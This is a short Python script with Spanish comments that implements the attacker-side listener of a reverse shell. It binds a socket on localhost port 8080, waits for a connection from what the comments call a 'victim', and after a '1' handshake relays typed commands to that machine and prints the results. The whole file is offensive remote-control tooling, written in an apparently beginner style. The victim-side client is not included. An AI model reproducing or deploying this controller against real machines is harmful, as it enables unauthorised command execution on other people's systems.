import socket

#?Crear el servidor para que escuche
server = socket.socket()
server.bind(("localhost", 8080))
server.listen(1)

#? Buble para esperar una victima

while True:
    #?Variables para aceptar las conexiones de las victiams
    victima,direccion = server.accept()
    
    
    print(f"Conexion de: {direccion}")
    
    #? Obtener el mesaje de la victima, en binario
    msBinario = victima.recv(1024)
    
    #? Codificar el mensaje
    msCodificado = msBinario.decode('ascii')
    
    #? si el mensaje es iugal a 1, hacemos un bucle
    if msCodificado == "1":
        while True:
            opcion = input("shell@shell: ")
            
            #? Enviar a la victima los mensajes codificados
            victima.send(opcion.encode('ascii'))
            
            #? Guardar el resultado en 2048 bytes
            resultado = victima.recv(2048)
            
            #?Imprimir
            print(resultado)
    else:  
        print("Error....!")
        break      